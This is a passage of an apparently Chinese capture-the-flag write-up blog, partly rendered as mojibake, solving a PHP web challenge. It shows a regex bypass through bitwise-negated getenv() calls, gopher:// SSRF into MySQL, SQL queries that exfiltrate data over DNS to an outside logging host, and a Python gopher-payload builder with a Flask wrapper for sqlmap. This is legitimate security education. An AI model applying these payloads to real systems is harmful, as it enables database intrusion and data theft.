Serverå¹¶ä¸”è·å–ç»“æœã€‚"></a><code>config.php</code>çš„å†…å®¹å‘Šè¯‰æˆ‘ä»¬flagæ˜¯åœ¨MySQL æ•°æ®åº“ä¸­ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥çš„ç›®æ ‡æ˜¯å»æŸ¥è¯¢MySQL Serverå¹¶ä¸”è·å–ç»“æœã€‚</h5><h5 id="å¹¶ä¸”æˆ‘ä»¬çŸ¥é“è¿™ä¸ªuseræ˜¯adminå¹¶ä¸”å¯†ç æ˜¯ç©ºçš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨gopher-åè®®æ¥SSRFå»æŸ¥è¯¢mysql-serverã€‚"><a href="#å¹¶ä¸”æˆ‘ä»¬çŸ¥é“è¿™ä¸ªuseræ˜¯adminå¹¶ä¸”å¯†ç æ˜¯ç©ºçš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨gopher-åè®®æ¥SSRFå»æŸ¥è¯¢mysql-serverã€‚" class="headerlink" title="å¹¶ä¸”æˆ‘ä»¬çŸ¥é“è¿™ä¸ªuseræ˜¯adminå¹¶ä¸”å¯†ç æ˜¯ç©ºçš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨gopher://åè®®æ¥SSRFå»æŸ¥è¯¢mysql serverã€‚"></a>å¹¶ä¸”æˆ‘ä»¬çŸ¥é“è¿™ä¸ªuseræ˜¯<code>admin</code>å¹¶ä¸”å¯†ç æ˜¯ç©ºçš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨<code>gopher://</code>åè®®æ¥SSRFå»æŸ¥è¯¢mysql serverã€‚</h5><h5 id="ä½†æ˜¯gopherçš„payloadæ˜¯ååˆ†é•¿çš„ï¼Œå› æ­¤æˆ‘ä»¬é¦–å…ˆéœ€è¦å»ç»•è¿‡è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ã€‚"><a href="#ä½†æ˜¯gopherçš„payloadæ˜¯ååˆ†é•¿çš„ï¼Œå› æ­¤æˆ‘ä»¬é¦–å…ˆéœ€è¦å»ç»•è¿‡è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ã€‚" class="headerlink" title="ä½†æ˜¯gopherçš„payloadæ˜¯ååˆ†é•¿çš„ï¼Œå› æ­¤æˆ‘ä»¬é¦–å…ˆéœ€è¦å»ç»•è¿‡è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ã€‚"></a>ä½†æ˜¯gopherçš„payloadæ˜¯ååˆ†é•¿çš„ï¼Œå› æ­¤æˆ‘ä»¬é¦–å…ˆéœ€è¦å»ç»•è¿‡è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ã€‚</h5><h5 id="å¦‚æœä½ å°è¯•å»æœç´¢å…¨éƒ¨çš„PHPå‡½æ•°ï¼Œå¹¶ä¸”æ»¡è¶³è¿™ä¸ªæ­£åˆ™è§„åˆ™å’Œé•¿åº¦é™åˆ¶ï¼Œä½ å°†ä¼šå‘ç°ä¸€ä¸ªå¯ç”¨çš„å‡½æ•°getenv"><a href="#å¦‚æœä½ å°è¯•å»æœç´¢å…¨éƒ¨çš„PHPå‡½æ•°ï¼Œå¹¶ä¸”æ»¡è¶³è¿™ä¸ªæ­£åˆ™è§„åˆ™å’Œé•¿åº¦é™åˆ¶ï¼Œä½ å°†ä¼šå‘ç°ä¸€ä¸ªå¯ç”¨çš„å‡½æ•°getenv" class="headerlink" title="å¦‚æœä½ å°è¯•å»æœç´¢å…¨éƒ¨çš„PHPå‡½æ•°ï¼Œå¹¶ä¸”æ»¡è¶³è¿™ä¸ªæ­£åˆ™è§„åˆ™å’Œé•¿åº¦é™åˆ¶ï¼Œä½ å°†ä¼šå‘ç°ä¸€ä¸ªå¯ç”¨çš„å‡½æ•°getenv()"></a>å¦‚æœä½ å°è¯•å»æœç´¢å…¨éƒ¨çš„PHPå‡½æ•°ï¼Œå¹¶ä¸”æ»¡è¶³è¿™ä¸ªæ­£åˆ™è§„åˆ™å’Œé•¿åº¦é™åˆ¶ï¼Œä½ å°†ä¼šå‘ç°ä¸€ä¸ªå¯ç”¨çš„å‡½æ•°<code>getenv()</code></h5><h5 id="è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªç‰¹åˆ«çš„å¤´éƒ¨å€¼ã€‚"><a href="#è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªç‰¹åˆ«çš„å¤´éƒ¨å€¼ã€‚" class="headerlink" title="è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªç‰¹åˆ«çš„å¤´éƒ¨å€¼ã€‚"></a>è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªç‰¹åˆ«çš„å¤´éƒ¨å€¼ã€‚</h5><h5 id="å› æ­¤æˆ‘ä»¬èƒ½å°†æˆ‘ä»¬çš„gopherçš„payloadæ”¾åˆ°è¿™ä¸ªHTTP-header"><a href="#å› æ­¤æˆ‘ä»¬èƒ½å°†æˆ‘ä»¬çš„gopherçš„payloadæ”¾åˆ°è¿™ä¸ªHTTP-header" class="headerlink" title="å› æ­¤æˆ‘ä»¬èƒ½å°†æˆ‘ä»¬çš„gopherçš„payloadæ”¾åˆ°è¿™ä¸ªHTTP header:"></a>å› æ­¤æˆ‘ä»¬èƒ½å°†æˆ‘ä»¬çš„gopherçš„payloadæ”¾åˆ°è¿™ä¸ªHTTP header:</h5><h5 id="98-9A-8B-9A-91-89-B7-AB-AB-AF-A0-AB-length-18"><a href="#98-9A-8B-9A-91-89-B7-AB-AB-AF-A0-AB-length-18" class="headerlink" title="(~%98%9A%8B%9A%91%89)(~%B7%AB%AB%AF%A0%AB) (length: 18)"></a><code>(~%98%9A%8B%9A%91%89)(~%B7%AB%AB%AF%A0%AB)</code> (length: 18)</h5><h5 id="å®ƒç­‰ä»·äºgetenv-quot-HTTP-T-quot-ã€‚"><a href="#å®ƒç­‰ä»·äºgetenv-quot-HTTP-T-quot-ã€‚" class="headerlink" title="å®ƒç­‰ä»·äºgetenv(&quot;HTTP_T&quot;)ã€‚"></a>å®ƒç­‰ä»·äº<code>getenv(&quot;HTTP_T&quot;)</code>ã€‚</h5><h5 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h5><h5 id="ç°åœ¨æˆ‘ä»¬å¯ä»¥SSRFï¼š"><a href="#ç°åœ¨æˆ‘ä»¬å¯ä»¥SSRFï¼š" class="headerlink" title="ç°åœ¨æˆ‘ä»¬å¯ä»¥SSRFï¼š"></a>ç°åœ¨æˆ‘ä»¬å¯ä»¥SSRFï¼š</h5><h5 id="ç°åœ¨ï¼Œæ‚¨æœ‰ä¸€ä¸ªç›²ç›®çš„SSRFï¼"><a href="#ç°åœ¨ï¼Œæ‚¨æœ‰ä¸€ä¸ªç›²ç›®çš„SSRFï¼" class="headerlink" title="ç°åœ¨ï¼Œæ‚¨æœ‰ä¸€ä¸ªç›²ç›®çš„SSRFï¼"></a>ç°åœ¨ï¼Œæ‚¨æœ‰ä¸€ä¸ªç›²ç›®çš„SSRFï¼</h5><h5 id="å¯¹äºMySQLåè®®ï¼Œå¯ä»¥ä½¿ç”¨Gopherusä¹‹ç±»çš„ä¸€äº›å·¥å…·æ¥åˆ›å»ºgopherè´Ÿè½½ã€‚"><a href="#å¯¹äºMySQLåè®®ï¼Œå¯ä»¥ä½¿ç”¨Gopherusä¹‹ç±»çš„ä¸€äº›å·¥å…·æ¥åˆ›å»ºgopherè´Ÿè½½ã€‚" class="headerlink" title="å¯¹äºMySQLåè®®ï¼Œå¯ä»¥ä½¿ç”¨Gopherusä¹‹ç±»çš„ä¸€äº›å·¥å…·æ¥åˆ›å»ºgopherè´Ÿè½½ã€‚"></a>å¯¹äºMySQLåè®®ï¼Œå¯ä»¥ä½¿ç”¨Gopherusä¹‹ç±»çš„ä¸€äº›å·¥å…·æ¥åˆ›å»ºgopherè´Ÿè½½ã€‚</h5><h5 id="æœ€åï¼Œæ‚¨åªéœ€è¦ä½¿ç”¨åŸºäºæ—¶é—´æˆ–å¸¦å¤–ï¼ˆDNSæ—¥å¿—ï¼‰çš„æ–¹æ³•æ¥æå–æŸ¥è¯¢ç»“æœã€‚"><a href="#æœ€åï¼Œæ‚¨åªéœ€è¦ä½¿ç”¨åŸºäºæ—¶é—´æˆ–å¸¦å¤–ï¼ˆDNSæ—¥å¿—ï¼‰çš„æ–¹æ³•æ¥æå–æŸ¥è¯¢ç»“æœã€‚" class="headerlink" title="æœ€åï¼Œæ‚¨åªéœ€è¦ä½¿ç”¨åŸºäºæ—¶é—´æˆ–å¸¦å¤–ï¼ˆDNSæ—¥å¿—ï¼‰çš„æ–¹æ³•æ¥æå–æŸ¥è¯¢ç»“æœã€‚"></a>æœ€åï¼Œæ‚¨åªéœ€è¦ä½¿ç”¨åŸºäºæ—¶é—´æˆ–å¸¦å¤–ï¼ˆDNSæ—¥å¿—ï¼‰çš„æ–¹æ³•æ¥æå–æŸ¥è¯¢ç»“æœã€‚</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&quot;\\\\&quot;,table_name,&quot;.e222e6f24ba81a9b414f.d.zhack.ca/a&quot;)) from information_schema.tables where table_schema=&quot;ThisIsTheDbName&quot;;</span><br><span class="line">Output: fl4ggg</span><br><span class="line">select load_file(concat(&quot;\\\\&quot;,column_name,&quot;.e222e6f24ba81a9b414f.d.zhack.ca/a&quot;)) from information_schema.columns where table_name=&quot;fl4ggg&quot;;</span><br><span class="line">Output: the_flag_col</span><br><span class="line">select load_file(concat(&quot;\\\\&quot;,hex(the_flag_col),&quot;.e222e6f24ba81a9b414f.d.zhack.ca/a&quot;)) from ThisIsTheDbName.fl4ggg;</span><br><span class="line">Output: 42616C736E7B337A5F77316E643077735F7068705F6368346C7D</span><br><span class="line">hex to ascii: Balsn&#123;3z_w1nd0ws_php_ch4l&#125;</span><br></pre></td></tr></table></figure>

<h5 id="æœ€åçš„è„šæœ¬ï¼š"><a href="#æœ€åçš„è„šæœ¬ï¼š" class="headerlink" title="æœ€åçš„è„šæœ¬ï¼š"></a>æœ€åçš„è„šæœ¬ï¼š</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySQL</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\033[31m"</span>+<span class="string">"For making it work username should not be password protected!!!"</span>+ <span class="string">"\033[0m"</span></span><br><span class="line">    user = <span class="string">'admin'</span> <span class="comment">#raw_input("\033[96m" +"\nGive MySQL username: " + "\033[0m")</span></span><br><span class="line">    encode_user = user.encode(<span class="string">"hex"</span>)</span><br><span class="line">    user_length = len(user)</span><br><span class="line">    temp = user_length - <span class="number">4</span></span><br><span class="line">    length = (chr(<span class="number">0xa3</span>+temp)).encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">    dump = length + <span class="string">"00000185a6ff0100000001210000000000000000000000000000000000000000000000"</span></span><br><span class="line">    dump +=  encode_user</span><br><span class="line">    dump += <span class="string">"00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c"</span></span><br><span class="line">    dump += <span class="string">"69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d"</span></span><br><span class="line">    dump += <span class="string">"067838365f36340c70726f6772616d5f6e616d65056d7973716c"</span></span><br><span class="line"></span><br><span class="line">    query = <span class="string">"show databases;"</span>;<span class="comment">#raw_input("\033[96m" +"Give query to execute: "+ "\033[0m")</span></span><br><span class="line"></span><br><span class="line">    auth = dump.replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        a = [s[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>)]</span><br><span class="line">        <span class="comment">#return "gopher://127.0.0.1:3306/_%" + "%".join(a)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"gopher://127.0.0.1:8787/_%"</span> + <span class="string">"%"</span>.join(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_payload</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(query.strip()!=<span class="string">''</span>):</span><br><span class="line">            query = query.encode(<span class="string">"hex"</span>)</span><br><span class="line">            query_length = <span class="string">'&#123;:06x&#125;'</span>.format((int((len(query) / <span class="number">2</span>) + <span class="number">1</span>)))</span><br><span class="line">            query_length = query_length.decode(<span class="string">'hex'</span>)[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>)</span><br><span class="line">            pay1 = query_length + <span class="string">"0003"</span> + query</span><br><span class="line">            final = self.encode(self.auth + pay1 + <span class="string">"0100000001"</span>)</span><br><span class="line">            <span class="keyword">return</span> final</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> encode(self.auth)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">'.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blind</span><span class="params">()</span>:</span></span><br><span class="line">    username = request.args.get(<span class="string">'username'</span>)</span><br><span class="line">    url = <span class="string">"http://localhost/gg.php"</span></span><br><span class="line">    url = <span class="string">"http://warmup.balsnctf.com/"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">n</span><span class="params">(s)</span>:</span></span><br><span class="line">        r = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            r += chr(~(ord(i)) &amp; <span class="number">0xFF</span>)</span><br><span class="line">        r = <span class="string">"~&#123;&#125;"</span>.format(r)</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">    t = <span class="string">'('</span> + n(<span class="string">'getenv'</span>) + <span class="string">')('</span> +n(<span class="string">'HTTP_X'</span>) + <span class="string">')'</span></span><br><span class="line">    <span class="comment"># x = MySQL().get_payload("select IF(TRUE AND (select '1'='&#123;username&#125;'), sleep(10), sleep(0));".format(username=username))</span></span><br><span class="line">    x = MySQL().get_payload(<span class="string">"select id from (select 1 as id)a where id='&#123;username&#125;';"</span>.format(username=username))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> repr(x)</span><br><span class="line">    <span class="keyword">print</span> len(t)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(url=url, params = &#123;</span><br><span class="line">            <span class="string">'op'</span> : <span class="string">'-9'</span>,</span><br><span class="line">            <span class="string">'Î£&gt;â€•(#Â°Ï‰Â°#)â™¡â†’'</span> : t</span><br><span class="line">            &#125;,</span><br><span class="line">            cookies = &#123;<span class="string">"PHPSESSID"</span> : <span class="string">"123"</span>&#125;,</span><br><span class="line">            headers = &#123;<span class="string">"X"</span>: x&#125;,</span><br><span class="line">            timeout = <span class="number">1.5</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">python sqlmap.py -u "http://localhost:5000/?username=*" --technique=T --dbms=mysql --dbs  --level 1 --time-sec=2</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>


      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/12/19/Defcamp-DCTF-2018-chat-Prototype-pollution-attackæœ‰æ„Ÿ/" rel="next" title="Defcamp(DCTF) 2018-chat Prototype pollution attackæœ‰æ„Ÿ">
                <i class="fa fa-chevron-left"></i> Defcamp(DCTF) 2018-chat Prototype pollution attackæœ‰æ„Ÿ
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/12/19/hack-lu-2019çš„éƒ¨åˆ†webé¢˜è§£/" rel="prev" title="hack.lu 2019çš„éƒ¨åˆ†webé¢˜è§£">
                hack.lu 2019çš„éƒ¨åˆ†webé¢˜è§£ <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            æ–‡ç« ç›®å½•
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            ç«™ç‚¹æ¦‚è§ˆ
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
            
              <p class="site-author-name" itemprop="name">Ljdd520</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">43</span>
                  <span class="site-state-item-name">æ—¥å¿—</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">10</span>
                  <span class="site-state-item-name">åˆ†ç±»</span>
                </a>
              </div>
            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                å‹æƒ…é“¾æ¥
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#å‰è¨€"><span class="nav-number">1.</span> <span class="nav-text">å‰è¨€</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-Koreanfish"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 Koreanfish</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#é¢˜ç›®æè¿°"><span class="nav-number">1.1.1.</span> <span class="nav-text">é¢˜ç›®æè¿°</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å°æ¹¾äººå–œæ¬¢éŸ©å›½ğŸŸ"><span class="nav-number">1.1.2.</span> <span class="nav-text">å°æ¹¾äººå–œæ¬¢éŸ©å›½ğŸŸ</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Source-Code"><span class="nav-number">1.1.3.</span> <span class="nav-text">Source Code</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#è¿™æ˜¯ä¸€ä¸ªç™½ç›’æµ‹è¯•ï¼Œå¹¶ä¸”å…¨éƒ¨çš„æºç æ˜¯éå¸¸çŸ­çš„å¹¶ä¸”æ˜¯ç®€å•çš„ã€‚"><span class="nav-number">1.1.4.</span> <span class="nav-text">è¿™æ˜¯ä¸€ä¸ªç™½ç›’æµ‹è¯•ï¼Œå¹¶ä¸”å…¨éƒ¨çš„æºç æ˜¯éå¸¸çŸ­çš„å¹¶ä¸”æ˜¯ç®€å•çš„ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å‰ç½®çŸ¥è¯†ã€‚"><span class="nav-number">1.1.5.</span> <span class="nav-text">å‰ç½®çŸ¥è¯†ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Sessionä¸Šä¼ è¿›åº¦ã€‚"><span class="nav-number">1.1.6.</span> <span class="nav-text">Sessionä¸Šä¼ è¿›åº¦ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å½“-session-upload-progress-enabled-INI-é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP-èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚-è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€"><span class="nav-number">1.1.7.</span> <span class="nav-text">å½“ session.upload_progress.enabled INI é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚ è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„session-upload-progress-nameåŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨-SESSIONä¸­è·å¾—ã€‚-å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨-SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®-ç´¢å¼•æ˜¯-session-upload-progress-prefix-ä¸-session-upload-progress-nameè¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚-é€šå¸¸è¿™äº›é”®å€¼å¯ä»¥é€šè¿‡è¯»å–INIè®¾ç½®æ¥è·å¾—ï¼Œä¾‹å¦‚"><span class="nav-number">1.1.8.</span> <span class="nav-text">å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨$_SESSIONä¸­è·å¾—ã€‚ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨$_SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯ session.upload_progress.prefix ä¸ session.upload_progress.nameè¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚ é€šå¸¸è¿™äº›é”®å€¼å¯ä»¥é€šè¿‡è¯»å–INIè®¾ç½®æ¥è·å¾—ï¼Œä¾‹å¦‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#é€šè¿‡å°†-SESSION-key-â€œcancel-uploadâ€-è®¾ç½®ä¸ºTRUEï¼Œè¿˜å¯ä»¥å–æ¶ˆä¸€ä¸ªæ­£åœ¨å¤„ç†ä¸­çš„æ–‡ä»¶ä¸Šä¼ ã€‚-å½“åœ¨åŒä¸€ä¸ªè¯·æ±‚ä¸­ä¸Šä¼ å¤šä¸ªæ–‡ä»¶ï¼Œå®ƒä»…ä¼šå–æ¶ˆå½“å‰æ­£åœ¨å¤„ç†çš„æ–‡ä»¶ä¸Šä¼ å’Œæœªå¤„ç†çš„æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯ä¸ä¼šç§»é™¤é‚£äº›å·²ç»å®Œæˆçš„ä¸Šä¼ ã€‚-å½“ä¸€ä¸ªä¸Šä¼ è¯·æ±‚è¢«è¿™ä¹ˆå–æ¶ˆæ—¶ï¼Œ-FILESä¸­çš„errorå°†ä¼šè¢«è®¾ç½®ä¸º-UPLOAD-ERR-EXTENSIONã€‚"><span class="nav-number">1.1.9.</span> <span class="nav-text">é€šè¿‡å°†$_SESSION[$key][â€œcancel_uploadâ€]è®¾ç½®ä¸ºTRUEï¼Œè¿˜å¯ä»¥å–æ¶ˆä¸€ä¸ªæ­£åœ¨å¤„ç†ä¸­çš„æ–‡ä»¶ä¸Šä¼ ã€‚ å½“åœ¨åŒä¸€ä¸ªè¯·æ±‚ä¸­ä¸Šä¼ å¤šä¸ªæ–‡ä»¶ï¼Œå®ƒä»…ä¼šå–æ¶ˆå½“å‰æ­£åœ¨å¤„ç†çš„æ–‡ä»¶ä¸Šä¼ å’Œæœªå¤„ç†çš„æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯ä¸ä¼šç§»é™¤é‚£äº›å·²ç»å®Œæˆçš„ä¸Šä¼ ã€‚ å½“ä¸€ä¸ªä¸Šä¼ è¯·æ±‚è¢«è¿™ä¹ˆå–æ¶ˆæ—¶ï¼Œ$_FILESä¸­çš„errorå°†ä¼šè¢«è®¾ç½®ä¸º 